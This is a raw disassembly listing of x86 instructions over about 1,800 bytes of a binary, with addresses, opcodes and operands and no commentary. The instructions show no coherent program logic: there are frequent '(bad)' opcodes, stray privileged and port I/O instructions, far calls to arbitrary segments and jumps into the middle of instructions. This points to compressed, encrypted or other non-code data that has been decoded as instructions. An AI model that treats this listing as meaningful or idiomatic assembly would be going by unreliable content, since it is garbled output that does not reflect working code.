  41ef87:	fmul   DWORD PTR [ebx+0x37541854]
  41ef8d:	xor    ch,BYTE PTR [esi+edi*1]
  41ef90:	cmp    edi,DWORD PTR [esi]
  41ef92:	rcr    DWORD PTR [ebx],cl
  41ef94:	in     al,0x80
  41ef96:	leave  
  41ef97:	mov    edx,0x527ce80b
  41ef9c:	ror    DWORD PTR [edx],cl
  41ef9e:	in     eax,dx
  41ef9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efa0:	fidiv  WORD PTR [ecx+0x1e]
  41efa3:	xchg   esi,eax
  41efa4:	pop    es
  41efa5:	cli    
  41efa6:	enter  0x6651,0x23
  41efaa:	mov    cl,0xba
  41efac:	lods   al,BYTE PTR ds:[esi]
  41efad:	mov    bl,0x94
  41efaf:	adc    DWORD PTR [ebx],edx
  41efb1:	sahf   
  41efb2:	dec    ebx
  41efb3:	sbb    BYTE PTR [eax+0x10fba34],dh
  41efb9:	and    al,0x9f
  41efbb:	inc    eax
  41efbc:	add    eax,0x28350588
  41efc1:	mov    eax,ds:0x412e6d99
  41efc6:	mov    esp,DWORD PTR ds:0x8915d998
  41efcc:	into   
  41efcd:	fs iret 
  41efcf:	sar    BYTE PTR [esi+0x11207af],cl
  41efd5:	xchg   edx,eax
  41efd6:	add    bl,BYTE PTR [ecx+ebp*1-0x1e0a0bdc]
  41efdd:	jp     0x41eff7
  41efdf:	xlat   BYTE PTR ds:[ebx]
  41efe0:	ffreep st(6)
  41efe2:	adc    ch,BYTE PTR [ecx+edi*8-0x5d097e38]
  41efe9:	fwait
  41efea:	jecxz  0x41efe0
  41efec:	lahf   
  41efed:	(bad)  
  41efee:	mov    ebp,?
  41eff0:	pop    esi
  41eff1:	mov    dl,0x3c
  41eff3:	scas   eax,DWORD PTR es:[edi]
  41eff4:	sub    BYTE PTR [ecx+ecx*4+0x4eaf1610],dh
  41effb:	lods   eax,DWORD PTR ds:[esi]
  41effc:	call   0x9ea5:0xf1a947a6
  41f003:	push   eax
  41f004:	pop    edi
  41f005:	mov    ecx,eax
  41f007:	dec    esi
  41f008:	dec    ebx
  41f009:	adc    esp,0x5c
  41f00c:	cmp    DWORD PTR ds:0xbd45f858,eax
  41f012:	sub    al,0x4e
  41f014:	cmp    bl,ch
  41f016:	shl    DWORD PTR [edx],cl
  41f018:	ds cld 
  41f01a:	push   ebp
  41f01b:	pop    ebx
  41f01c:	mov    ebx,0x19847e26
  41f021:	sbb    al,BYTE PTR [eax]
  41f023:	push   esp
  41f024:	dec    ecx
  41f025:	cmp    bh,cl
  41f027:	lock ret 
  41f029:	les    edx,FWORD PTR [ebp+0x49]
  41f02c:	pop    esp
  41f02d:	mov    ah,0xe4
  41f02f:	loop   0x41f060
  41f031:	dec    esi
  41f032:	pop    ecx
  41f033:	mov    eax,ds:0x78cc97b9
  41f038:	pop    es
  41f039:	inc    esi
  41f03a:	xchg   ecx,eax
  41f03b:	retf   0x491a
  41f03e:	outs   dx,DWORD PTR ds:[esi]
  41f03f:	iret   
  41f040:	mov    ebx,0x68fadee7
  41f045:	enter  0x4d1b,0x4d
  41f049:	cmp    DWORD PTR [ebp+0x2d],0x3b
  41f04d:	push   esp
  41f04e:	or     al,0xc9
  41f050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f051:	jo     0x41f028
  41f053:	pop    edx
  41f054:	(bad)  
  41f055:	int    0x8e
  41f057:	int    0x28
  41f059:	push   esp
  41f05a:	push   edx
  41f05b:	std    
  41f05c:	or     al,0xbd
  41f05e:	inc    ebx
  41f05f:	sub    DWORD PTR [edi-0x56],0xffffffd3
  41f063:	xchg   dh,al
  41f065:	jno    0x41f065
  41f067:	inc    eax
  41f068:	add    ebx,edx
  41f06a:	(bad)  [ecx]
  41f06c:	adc    DWORD PTR [esp+ebp*2+0x25266c6a],ebp
  41f073:	push   ebp
  41f074:	add    edi,eax
  41f076:	jns    0x41f09a
  41f078:	push   esi
  41f079:	push   0xec1b136b
  41f07e:	push   ebp
  41f07f:	cmc    
  41f080:	shr    DWORD PTR ds:0x2fcdd6fa,0xe8
  41f087:	push   ebx
  41f088:	adc    DWORD PTR [ebx-0x11],edi
  41f08b:	xchg   ebp,eax
  41f08c:	sub    ebp,DWORD PTR [ecx]
  41f08e:	jb     0x41f0d4
  41f090:	and    al,0x65
  41f092:	fwait
  41f093:	lock cmp DWORD PTR [di+0x25cf],esp
  41f099:	imul   edx,eax,0x19694f12
  41f09f:	push   ebx
  41f0a0:	imul   esp,DWORD PTR [edi],0x2b
  41f0a3:	cmp    eax,0xc4968c10
  41f0a8:	mov    ah,0x5
  41f0aa:	dec    edx
  41f0ab:	hlt    
  41f0ac:	or     DWORD PTR [ecx],ecx
  41f0ae:	dec    edi
  41f0af:	(bad)  
  41f0b0:	loope  0x41f0a3
  41f0b2:	ss test al,0xf7
  41f0b5:	adc    al,0x75
  41f0b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0b8:	jne    0x41f0bd
  41f0ba:	call   0x15004f37
  41f0bf:	push   0xd24ffa7c
  41f0c4:	call   0x820126a6
  41f0c9:	pop    ds
  41f0ca:	test   BYTE PTR [ebx],0xb0
  41f0cd:	jae    0x41f111
  41f0cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0d0:	aaa    
  41f0d1:	or     BYTE PTR [edi+0x33],cl
  41f0d4:	add    BYTE PTR [eax*1-0x3fa99723],dh
  41f0db:	sub    al,0x27
  41f0dd:	fwait
  41f0de:	adc    eax,0x200433dd
  41f0e3:	or     cl,BYTE PTR [edx+eiz*1]
  41f0e6:	leave  
  41f0e7:	mov    esi,0x376a0fa1
  41f0ec:	fs sub ah,bh
  41f0ef:	lods   al,BYTE PTR ds:[esi]
  41f0f0:	mov    ds:0x2a3477ee,al
  41f0f5:	adc    ecx,DWORD PTR [esi-0x69a96d21]
  41f0fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0fc:	lock xchg ebp,eax
  41f0fe:	mov    esi,0x6051008d
  41f103:	arpl   ax,di
  41f105:	mov    BYTE PTR [edx+ebp*1+0x7f775de2],dl
  41f10c:	and    BYTE PTR [eax-0x3e],bh
  41f10f:	dec    edi
  41f110:	mov    esi,0xd2a48c70
  41f115:	push   esi
  41f116:	aad    0x99
  41f118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f119:	sub    DWORD PTR [ebx-0x44169918],esp
  41f11f:	stos   BYTE PTR es:[edi],al
  41f120:	sbb    ecx,DWORD PTR [eax-0x7e2cad03]
  41f126:	mov    edi,0x9ab6ca3b
  41f12b:	push   edi
  41f12c:	pop    edx
  41f12d:	out    0x2d,al
  41f12f:	stos   BYTE PTR es:[edi],al
  41f130:	popf   
  41f131:	loope  0x41f0fe
  41f133:	push   esi
  41f134:	push   edi
  41f135:	test   BYTE PTR [ebx+esi*1+0x2c],0x63
  41f13a:	addr16 shl cl,cl
  41f13d:	mov    ecx,0xe9d0e907
  41f142:	cmp    eax,0xe9d0481
  41f147:	pop    ebp
  41f148:	cmp    esp,ecx
  41f14a:	mov    ebp,0xd1c17a21
  41f14f:	cld    
  41f150:	call   0x7b8a:0x1468750b
  41f157:	xor    bh,BYTE PTR [ecx]
  41f159:	sbb    dl,BYTE PTR [eax+0x74]
  41f15c:	hlt    
  41f15d:	call   0xfd98:0xcb743fbc
  41f164:	sub    ebp,DWORD PTR [ebp+0x327ad63c]
  41f16a:	mov    ds:0x804f32d9,eax
  41f16f:	xchg   DWORD PTR [edi],ebp
  41f171:	mov    ch,0xa
  41f173:	aam    0x38
  41f175:	or     BYTE PTR [edx-0x63f08867],cl
  41f17b:	popa   
  41f17c:	pop    esi
  41f17d:	pop    ds
  41f17e:	xchg   BYTE PTR [edi+0x571186e6],bh
  41f184:	sti    
  41f185:	add    BYTE PTR ds:0xff623640,dl
  41f18b:	inc    ebp
  41f18c:	sbb    BYTE PTR [edx+0x514bb5a7],ch
  41f192:	xchg   esi,eax
  41f193:	mov    ds:0x5117cfe4,eax
  41f198:	ins    BYTE PTR es:[edi],dx
  41f199:	pop    edi
  41f19a:	fbld   TBYTE PTR [edx-0x48]
  41f19d:	push   ds
  41f19e:	sti    
  41f19f:	icebp  
  41f1a0:	and    bh,BYTE PTR [ebp+ebp*2-0x31]
  41f1a4:	int3   
  41f1a5:	lds    edi,FWORD PTR [edi]
  41f1a7:	dec    edx
  41f1a8:	hlt    
  41f1a9:	in     al,dx
  41f1aa:	sub    DWORD PTR [eax],edx
  41f1ac:	push   0xf5be3b07
  41f1b1:	ja     0x41f194
  41f1b3:	sbb    BYTE PTR [ebx+eax*2],0x1c
  41f1b7:	(bad)  
  41f1b8:	cmp    eax,0xc903480b
  41f1bd:	(bad)  
  41f1be:	cs test eax,0x383672c0
  41f1c4:	push   edi
  41f1c5:	dec    edi
  41f1c6:	sub    ecx,0x16
  41f1c9:	ja     0x41f216
  41f1cb:	sub    al,0xc3
  41f1cd:	jmp    0xb400:0x38126d3
  41f1d4:	inc    edx
  41f1d5:	xor    BYTE PTR [edx-0x26],ch
  41f1d8:	or     DWORD PTR [edi],0xffffffa6
  41f1db:	or     esi,edx
  41f1dd:	or     BYTE PTR [ecx-0x1c],0x6d
  41f1e1:	adc    bh,BYTE PTR [ebp-0x39]
  41f1e4:	imul   edi,eax,0x1d
  41f1e7:	mov    al,0xef
  41f1e9:	xchg   esp,eax
  41f1ea:	stos   BYTE PTR es:[edi],al
  41f1eb:	lods   al,BYTE PTR ds:[esi]
  41f1ec:	sub    eax,0x50445b3f
  41f1f1:	idiv   DWORD PTR [ebx-0x55755bc3]
  41f1f7:	mov    al,ds:0x5eda6103
  41f1fc:	(bad)
  41f1ff:	ror    DWORD PTR [edx],cl
  41f201:	mov    ebx,0x7347d292
  41f206:	and    DWORD PTR [edi+0x40b6b28c],esp
  41f20c:	mov    eax,0xf59c22ad
  41f211:	fwait
  41f212:	gs or  eax,0xd3ad7c61
  41f218:	add    cl,BYTE PTR [ecx+0x5a]
  41f21b:	mov    esp,0x3972c3c9
  41f220:	ds arpl dx,ax
  41f223:	test   al,0x5a
  41f225:	pop    ebp
  41f226:	jne    0x41f21d
  41f228:	push   ebp
  41f229:	pop    esi
  41f22a:	adc    al,0xe6
  41f22c:	pop    ds
  41f22d:	cmp    al,0xbf
  41f22f:	cmp    DWORD PTR [esi-0x488c01da],esp
  41f235:	fwait
  41f236:	inc    esi
  41f237:	popa   
  41f238:	imul   ecx,DWORD PTR [edi],0x76
  41f23b:	addr16 (bad) 
  41f23d:	scas   al,BYTE PTR es:[edi]
  41f23e:	scas   al,BYTE PTR es:[edi]
  41f23f:	out    0x70,eax
  41f241:	xchg   esp,eax
  41f242:	mov    esi,0x91f53f0a
  41f247:	push   ebp
  41f248:	test   eax,0x6e90cdf7
  41f24d:	lock stc 
  41f24f:	fadd   st,st(6)
  41f252:	fmul   DWORD PTR [edi+0x4c]
  41f255:	xchg   ebp,eax
  41f256:	mov    edi,0xf243e9e4
  41f25b:	xor    eax,0x26e83f5f
  41f260:	push   0x36afbb8
  41f265:	outs   dx,DWORD PTR ds:[esi]
  41f266:	bnd ret 0x61a8
  41f26a:	ret    0xe1aa
  41f26d:	je     0x41f2af
  41f26f:	js     0x41f284
  41f271:	or     bl,0xca
  41f274:	adc    eax,0xa63c438c
  41f279:	mov    esp,0x16fc1260
  41f27e:	pop    esp
  41f27f:	ins    BYTE PTR es:[edi],dx
  41f280:	out    dx,eax
  41f281:	xchg   esp,eax
  41f282:	jnp    0x41f244
  41f284:	js     0x41f26a
  41f286:	cwde   
  41f287:	inc    ecx
  41f288:	test   eax,0xa8ec43a
  41f28d:	data16 ficom WORD PTR [eax-0x489bb3c1]
  41f294:	xlat   BYTE PTR ds:[ebx]
  41f295:	repnz push ebp
  41f297:	xor    DWORD PTR [ecx-0x54],eax
  41f29a:	xor    cl,BYTE PTR [ebp-0x28]
  41f29d:	lods   eax,DWORD PTR ds:[esi]
  41f29e:	lea    esp,[eax+0x5233cab]
  41f2a4:	adc    eax,0xc94cbda3
  41f2a9:	push   ebp
  41f2aa:	mov    al,0xbc
  41f2ac:	mov    WORD PTR [ebx+0x29eb0c28],gs
  41f2b2:	jns    0x41f248
  41f2b4:	imul   edx,DWORD PTR [edx],0xffffffaf
  41f2b7:	jne    0x41f2b4
  41f2b9:	(bad)  
  41f2ba:	loopne 0x41f338
  41f2bc:	and    DWORD PTR [edi+eiz*8-0x15],ecx
  41f2c0:	xchg   esp,eax
  41f2c1:	push   0x38
  41f2c3:	leave  
  41f2c4:	jle    0x41f254
  41f2c6:	lea    ebx,[esi+0x9]
  41f2c9:	and    eax,0xffd1b46d
  41f2ce:	push   ebp
  41f2cf:	mov    es,ecx
  41f2d1:	stos   BYTE PTR es:[edi],al
  41f2d2:	addr16 aad 0xc9
  41f2d5:	daa    
  41f2d6:	(bad)  
  41f2d8:	das    
  41f2d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2da:	sub    al,0xe5
  41f2dc:	sbb    eax,0xe7e72f94
  41f2e1:	jge    0x41f33c
  41f2e3:	psrlw  mm6,mm3
  41f2e6:	xchg   edi,eax
  41f2e7:	mov    DWORD PTR [eax],ebp
  41f2e9:	jl     0x41f275
  41f2eb:	in     al,dx
  41f2ec:	rcr    ebx,cl
  41f2ee:	sub    dh,BYTE PTR ds:0x430b09f9
  41f2f4:	out    0x90,eax
  41f2f6:	ins    BYTE PTR es:[edi],dx
  41f2f7:	rcr    BYTE PTR [ebx],0x42
  41f2fa:	mov    ebp,ecx
  41f2fc:	dec    eax
  41f2fd:	dec    ebx
  41f2fe:	add    al,0xc0
  41f300:	adc    DWORD PTR [esi],ecx
  41f302:	adc    DWORD PTR [esi+eiz*4-0x5c768cca],ebx
  41f309:	dec    ebx
  41f30a:	fisub  DWORD PTR [edx+0x6]
  41f30d:	jmp    0x41f32c
  41f30f:	xchg   esi,ebx
  41f311:	sbb    eax,0xab058c18
  41f316:	scas   al,BYTE PTR es:[edi]
  41f317:	pop    esp
  41f318:	jge    0x41f30a
  41f31a:	clc    
  41f31b:	push   ss
  41f31c:	jl     0x41f36b
  41f31e:	test   DWORD PTR [ecx+0x7f],0x81131c75
  41f325:	(bad)  
  41f326:	fwait
  41f327:	push   ecx
  41f328:	loopne 0x41f36d
  41f32a:	xchg   BYTE PTR [ebp+0x43],dl
  41f32d:	sbb    BYTE PTR [eax+eiz*1+0x20],bl
  41f331:	int3   
  41f332:	out    dx,al
  41f333:	xchg   edx,eax
  41f334:	jle    0x41f367
  41f336:	shl    dl,cl
  41f338:	test   al,0x64
  41f33a:	mov    esi,DWORD PTR [esi-0x69]
  41f33d:	sub    eax,0x3d7b4d1e
  41f342:	(bad)  
  41f343:	jbe    0x41f3b2
  41f345:	jb     0x41f339
  41f347:	inc    esp
  41f348:	push   0xffffffeb
  41f34a:	popa   
  41f34b:	std    
  41f34c:	ins    BYTE PTR es:[edi],dx
  41f34d:	lods   al,BYTE PTR ds:[esi]
  41f34e:	sbb    eax,0x3ad5e452
  41f353:	pop    ds
  41f354:	enter  0x1667,0x5d
  41f358:	mov    esi,0x52a81e3a
  41f35d:	sbb    BYTE PTR [esi-0xbfe2bb9],dh
  41f363:	inc    eax
  41f364:	sbb    DWORD PTR [edi+ebx*2],esi
  41f367:	add    ebx,eax
  41f369:	xchg   ebp,eax
  41f36a:	(bad)  
  41f36b:	cmp    al,0x27
  41f36d:	pop    edi
  41f36e:	pushf  
  41f36f:	sbb    al,0x2c
  41f371:	dec    ebx
  41f372:	add    eax,0x6993f74a
  41f377:	sbb    DWORD PTR [edi],edi
  41f379:	push   ebx
  41f37a:	iret   
  41f37b:	loopne 0x41f38c
  41f37d:	jecxz  0x41f383
  41f37f:	xor    DWORD PTR [eax+0x30a1f2e6],ebp
  41f385:	push   esp
  41f386:	test   eax,0x899f3e5d
  41f38b:	mov    esp,0x1844a63a
  41f390:	or     al,BYTE PTR [esi-0x72]
  41f393:	shl    DWORD PTR gs:[edi-0x40],1
  41f397:	pop    es
  41f398:	(bad)  
  41f399:	sti    
  41f39a:	sbb    ebx,edx
  41f39c:	iret   
  41f39d:	adc    al,0xa1
  41f39f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3a0:	pop    ss
  41f3a1:	leave  
  41f3a2:	test   al,0x91
  41f3a4:	(bad)  
  41f3a5:	sbb    bl,BYTE PTR [edx+0x35627fa5]
  41f3ab:	test   eax,0x2714ae61
  41f3b0:	sti    
  41f3b1:	adc    BYTE PTR [edx],ch
  41f3b3:	cwde   
  41f3b4:	lock addr16 push 0x1d3ab6b9
  41f3bb:	rcl    DWORD PTR [esi+0x2fbdf062],0xe
  41f3c2:	jo     0x41f3f7
  41f3c4:	mov    ds,ecx
  41f3c6:	and    al,0xdf
  41f3c8:	or     ecx,DWORD PTR [ebx-0x69]
  41f3cb:	inc    edx
  41f3cc:	leave  
  41f3cd:	addr16 mov eax,ds:0x92a5
  41f3d1:	mov    edx,0x2e15406e
  41f3d6:	aad    0xf4
  41f3d8:	(bad)  
  41f3d9:	in     al,dx
  41f3da:	test   DWORD PTR [ecx-0x1a7c53c3],esi
  41f3e0:	je     0x41f454
  41f3e2:	mov    esp,0x5d5cf039
  41f3e7:	cmp    DWORD PTR [edi+0x78],eax
  41f3ea:	inc    ecx
  41f3eb:	add    al,0x3d
  41f3ed:	cwde   
  41f3ee:	xchg   edx,eax
  41f3ef:	data16 cli 
  41f3f1:	sbb    ecx,DWORD PTR [esi+0x15]
  41f3f4:	xchg   ebx,eax
  41f3f5:	push   ebx
  41f3f6:	xchg   esp,eax
  41f3f7:	push   ebx
  41f3f8:	rcr    esp,1
  41f3fa:	or     DWORD PTR [edx+ebp*2+0x7d],esi
  41f3fe:	mov    bh,cl
  41f400:	mov    al,0x3c
  41f402:	call   0x45f0ac33
  41f407:	mov    BYTE PTR ss:[eax],al
  41f40a:	jmp    0x66b35a0
  41f40f:	jl     0x41f406
  41f411:	mov    bh,0xed
  41f413:	cmp    BYTE PTR [ebp+0x4ac6b075],0xf5
  41f41a:	(bad)  
  41f41b:	push   edx
  41f41c:	scas   al,BYTE PTR es:[edi]
  41f41d:	sub    eax,0x79a727ab
  41f422:	jae    0x41f42e
  41f424:	sub    BYTE PTR [edi+0x5a],al
  41f427:	test   DWORD PTR [ebp+0x79db7288],0x6377722d
  41f431:	mov    DWORD PTR [eax-0x23],0x355e1fe5
  41f438:	retf   
  41f439:	into   
  41f43a:	add    dh,al
  41f43c:	xchg   ebp,eax
  41f43d:	jns    0x41f473
  41f43f:	push   eax
  41f440:	adc    DWORD PTR [ecx],0x59
  41f443:	retf   0x50aa
  41f446:	sub    eax,0x52e9b593
  41f44b:	dec    ebp
  41f44c:	dec    esp
  41f44d:	inc    ebp
  41f44e:	pop    edi
  41f44f:	inc    ebp
  41f450:	pop    ebx
  41f451:	pop    edi
  41f452:	shr    BYTE PTR [esi+0x27],0x49
  41f456:	(bad)  
  41f457:	test   DWORD PTR [ecx+0x183d8f4],ecx
  41f45d:	add    BYTE PTR [eax+0x52000006],cl
  41f463:	shl    esp,1
  41f465:	scas   eax,DWORD PTR es:[edi]
  41f466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f467:	jo     0x41f4b5
  41f469:	les    ebx,FWORD PTR [ebx-0x47]
  41f46c:	or     eax,0xbb2f8564
  41f471:	mov    ch,0x1d
  41f473:	jecxz  0x41f41b
  41f475:	es retf 
  41f477:	popf   
  41f478:	cmp    al,0xac
  41f47a:	mov    dh,bh
  41f47c:	jbe    0x41f4f8
  41f47e:	jno    0x41f43b
  41f480:	(bad)
  41f483:	push   es
  41f484:	dec    ebx
  41f485:	sub    ebx,edx
  41f487:	mov    esp,0x8be61542
  41f48c:	mov    ah,0xe6
  41f48e:	stc    
  41f48f:	xor    BYTE PTR es:[ecx+0x54cd1570],0x3f
  41f497:	jno    0x41f4d5
  41f499:	gs push cs
  41f49b:	jnp    0x41f51a
  41f49d:	jg     0x41f4f3
  41f49f:	jo     0x41f43b
  41f4a1:	sbb    edi,DWORD PTR [ebx]
  41f4a3:	dec    eax
  41f4a4:	jb     0x41f430
  41f4a6:	test   BYTE PTR [edi+0x52],dh
  41f4a9:	adc    dh,ch
  41f4ab:	hlt    
  41f4ac:	inc    edx
  41f4ad:	and    bl,BYTE PTR [ecx]
  41f4af:	xor    cl,0x28
  41f4b2:	(bad)  
  41f4b4:	fwait
  41f4b5:	mov    edi,0x7da9ac51
  41f4ba:	shl    dh,1
  41f4bc:	add    BYTE PTR [esp+ebx*2+0xbf6018d],al
  41f4c3:	(bad)  
  41f4c5:	mov    eax,0xf6b51f76
  41f4ca:	dec    edx
  41f4cb:	pop    edi
  41f4cc:	sbb    DWORD PTR [ecx+ebp*2],ebp
  41f4cf:	sbb    bl,BYTE PTR [edi]
  41f4d1:	dec    ecx
  41f4d2:	mov    esi,DWORD PTR [esi-0x28b360fd]
  41f4d8:	lock jmp FWORD PTR ds:0xfac12777
  41f4df:	shr    esi,cl
  41f4e1:	and    ch,ah
  41f4e3:	hlt    
  41f4e4:	xchg   ebp,eax
  41f4e5:	pushf  
  41f4e6:	sub    BYTE PTR [eax-0x48a83327],0xad
  41f4ed:	in     al,0x1e
  41f4ef:	lock scas eax,DWORD PTR es:[edi]
  41f4f1:	mov    al,0x7b
  41f4f3:	inc    ebp
  41f4f4:	mov    dl,BYTE PTR [esi+0x72]
  41f4f7:	and    DWORD PTR [eax],ecx
  41f4f9:	inc    edi
  41f4fa:	outs   dx,DWORD PTR ds:[esi]
  41f4fb:	xchg   dh,ah
  41f4fd:	xchg   ebx,eax
  41f4fe:	jle    0x41f4c1
  41f500:	jg     0x41f49a
  41f502:	adc    ebp,DWORD PTR [edi+0x741a42f7]
  41f508:	imul   ebx,DWORD PTR [eax+0x19],0xddda4e84
  41f50f:	call   0x63e0:0x2d5792f1
  41f516:	scas   eax,DWORD PTR es:[edi]
  41f517:	and    ah,0x1a
  41f51a:	xchg   ebp,eax
  41f51b:	inc    esi
  41f51c:	inc    BYTE PTR [ebx+0x6f]
  41f51f:	aas    
  41f520:	xlat   BYTE PTR ds:[ebx]
  41f521:	xor    dl,BYTE PTR [eax+0xb6bfdf1]
  41f527:	push   cs
  41f528:	jbe    0x41f4fd
  41f52a:	hlt    
  41f52b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f52c:	fidiv  WORD PTR [ecx]
  41f52e:	repnz idiv DWORD PTR [ecx]
  41f531:	dec    esi
  41f532:	sub    al,0x64
  41f534:	and    dl,bl
  41f536:	pop    ss
  41f537:	loop   0x41f591
  41f539:	ret    0x57ba
  41f53c:	jbe    0x41f514
  41f53e:	add    ebp,esp
  41f540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f541:	cmp    al,0x57
  41f543:	pop    ds
  41f544:	imul   esp,DWORD PTR ds:0x9b44903a,0xb
  41f54b:	int    0x37
  41f54d:	or     al,0x32
  41f54f:	loope  0x41f5a9
  41f551:	retf   
  41f552:	popa   
  41f553:	pop    esp
  41f554:	xor    al,0xfa
  41f556:	jmp    0x1d1c8154
  41f55b:	inc    ebx
  41f55c:	call   0x1505:0x93c9515d
  41f563:	adc    eax,0x606057b0
  41f568:	adc    bl,BYTE PTR [eax]
  41f56a:	mov    esi,0xdeffe346
  41f56f:	loopne 0x41f5e7
  41f571:	inc    ebx
  41f572:	jmp    0x222e:0x278daca1
  41f579:	shr    BYTE PTR [ebp-0x6d6a6405],cl
  41f57f:	sbb    eax,0xea28fc5b
  41f584:	fcmovnb st,st(0)
  41f586:	inc    esp
  41f587:	call   0x58fd:0xe110db7a
  41f58e:	mov    ch,0xec
  41f590:	or     al,0x7f
  41f592:	pushf  
  41f593:	xchg   edi,eax
  41f594:	cs (bad) 
  41f597:	addr16 and edx,edi
  41f59a:	pop    eax
  41f59b:	(bad)
  41f59e:	test   eax,0x53f5024e
  41f5a3:	fiadd  WORD PTR [esi+0x1f]
  41f5a6:	jmp    0xa996f0f9
  41f5ab:	and    ebp,DWORD PTR [esi+0x7674941b]
  41f5b1:	in     al,0x80
  41f5b3:	mov    ah,0xc7
  41f5b5:	(bad)  
  41f5b6:	and    eax,0x1651d60
  41f5bb:	(bad)  
  41f5bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5bd:	in     al,dx
  41f5be:	mov    esp,0x2b1e9e2
  41f5c3:	pusha  
  41f5c4:	pop    edx
  41f5c5:	(bad)  
  41f5c6:	call   FWORD PTR [ecx]
  41f5c8:	imul   eax,DWORD PTR [ebx],0x7e
  41f5cb:	mov    edx,0xb247726d
  41f5d0:	popa   
  41f5d1:	adc    al,0x34
  41f5d3:	in     eax,dx
  41f5d4:	jne    0x41f5c6
  41f5d6:	xlat   BYTE PTR ds:[ebx]
  41f5d7:	push   ss
  41f5d8:	stc    
  41f5d9:	mov    cs,WORD PTR [edx-0x5390aff2]
  41f5df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5e0:	das    
  41f5e1:	push   eax
  41f5e2:	out    0x64,al
  41f5e4:	jnp    0x41f5f6
  41f5e6:	sub    esi,edi
  41f5e8:	shl    edx,0x2f
  41f5eb:	push   ecx
  41f5ec:	mov    cl,0x69
  41f5ee:	jno    0x41f5af
  41f5f0:	cmp    ecx,DWORD PTR [edx]
  41f5f2:	das    
  41f5f3:	nop
  41f5f4:	mov    ebx,0x24c0863b
  41f5f9:	and    BYTE PTR [edx+0x7884fbbb],bl
  41f5ff:	adc    BYTE PTR [ebx],ch
  41f601:	int    0xb2
  41f603:	sahf   
  41f604:	mov    al,0x8f
  41f606:	sbb    al,0x20
  41f608:	xor    BYTE PTR [eax-0x17],0x8b
  41f60c:	dec    eax
  41f60e:	add    al,0x7e
  41f610:	inc    eax
  41f611:	sub    DWORD PTR [ebx*2+0x4f597624],edx
  41f618:	adc    bh,ch
  41f61a:	repnz fcom QWORD PTR [ecx-0x1dcba320]
  41f621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f622:	and    esi,DWORD PTR [esi]
  41f624:	outs   dx,BYTE PTR ds:[esi]
  41f625:	push   eax
  41f626:	mov    bh,0xa4
  41f628:	bound  esi,QWORD PTR [ecx-0x2070f94e]
  41f62e:	push   0x888586de
  41f633:	std    
  41f634:	jl     0x41f62a
  41f636:	dec    edi
  41f637:	rol    BYTE PTR [eax],0x66
  41f63a:	lahf   
  41f63b:	jmp    0xa816:0xc44f454c
  41f642:	test   al,0x96
  41f644:	ja     0x41f63e
  41f646:	pop    ss
  41f647:	stc    
  41f648:	sub    eax,0x7d993642
  41f64d:	in     al,0x3b
  41f64f:	aad    0x94
  41f651:	push   ebx
  41f652:	shr    BYTE PTR [ebp-0x54deb9b6],cl
  41f658:	push   ebp
  41f659:	pushf  
  41f65a:	or     al,0x57
  41f65c:	push   ds
  41f65d:	fucom  st(5)
  41f65f:	inc    ecx
  41f660:	xchg   edi,eax
  41f661:	mov    cl,dh
  41f663:	outs   dx,DWORD PTR ds:[esi]
  41f664:	xlat   BYTE PTR ds:[ebx]
  41f665:	mov    al,0x8c
  41f667:	push   ebx
  41f668:	jle    0x41f5f2
  41f66a:	ret    0xeda0
  41f66d:	fisubr WORD PTR [esi]
  41f66f:	mov    al,0xed
  41f671:	in     eax,0x80
  41f673:	into   
  41f674:	push   es
  41f675:	lea    ebp,[ebp+0x26]
  41f678:	adc    eax,0xcd561727
  41f67d:	sbb    DWORD PTR [esi-0x297cc359],0xffffffbf
  41f684:	mov    ds:0xd51c24fc,al
  41f689:	cli    
  41f68a:	sub    eax,0x97ef5ec0
  41f68f:	jbe    0x41f6d8
  41f691:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41f693:	fwait
  41f694:	xchg   esi,eax
  41f695:	fsubr  DWORD PTR [edi+edx*1]
  41f698:	out    dx,al
  41f699:	outs   dx,DWORD PTR ds:[esi]
  41f69a:	aad    0x1e
  41f69c:	pop    edi
  41f69d:	neg    BYTE PTR [ecx+0x3509dc1a]
  41f6a3:	hlt    
  41f6a4:	push   ecx
  41f6a5:	mov    ch,0x86
  41f6a7:	stos   BYTE PTR es:[edi],al
  41f6a8:	cdq    
  41f6a9:	add    bh,BYTE PTR ds:0xdfe021a7
  41f6af:	push   ds
  41f6b0:	shr    BYTE PTR [edx-0x40],1
  41f6b3:	xchg   esi,eax
  41f6b4:	or     edi,DWORD PTR [edx]
  41f6b6:	inc    ecx
  41f6b7:	add    bh,BYTE PTR [eax]
  41f6b9:	arpl   sp,sp
  41f6bb:	jecxz  0x41f645
  41f6bd:	cmp    al,0xa1
  41f6bf:	jns    0x41f6b2
  41f6c1:	cld    
  41f6c2:	mov    dl,0x7
  41f6c4:	pop    ebx
  41f6c5:	mov    al,0x1a
  41f6c7:	in     al,dx
  41f6c8:	cli    
  41f6c9:	call   0xd858:0x835fe293
  41f6d0:	pop    ss
  41f6d1:	jne    0x41f655
  41f6d3:	and    dl,dh
  41f6d5:	scas   eax,DWORD PTR es:[edi]
  41f6d6:	cmp    dh,BYTE PTR [eax-0x2381501d]
  41f6dc:	fsub   QWORD PTR [esi]
  41f6de:	jmp    0xc86b:0x7e30902d
  41f6e5:	mov    ch,al
  41f6e7:	pop    ecx
  41f6e8:	adc    ah,bh
  41f6ea:	int    0x7c
  41f6ec:	push   ecx
  41f6ed:	mov    eax,DWORD PTR [ecx+0x735006fd]
  41f6f3:	nop
  41f6f4:	lods   al,BYTE PTR ds:[esi]
  41f6f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6f6:	pop    ebx
  41f6f7:	mov    dl,0xb7
